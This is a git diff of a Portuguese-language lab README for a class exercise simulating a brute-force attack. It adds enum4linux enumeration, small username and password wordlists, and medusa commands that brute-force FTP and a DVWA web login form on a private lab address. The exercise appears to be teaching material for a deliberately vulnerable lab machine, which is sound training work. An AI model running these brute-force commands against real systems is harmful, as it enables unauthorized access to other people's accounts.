@@ -17,3 +17,14 @@ Antes do ataque, foi utilizada a ferramenta `enum4linux` para coletar informaÃ§Ã
 
 ```bash
 enum4linux -a 192.168.56.102 | tee enum4_output.txt# AULA-Simulando-ataque-brute-force
+
+echo -e 'user\nmsfadmin\nnadmin\nroot' > users.txt
+
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
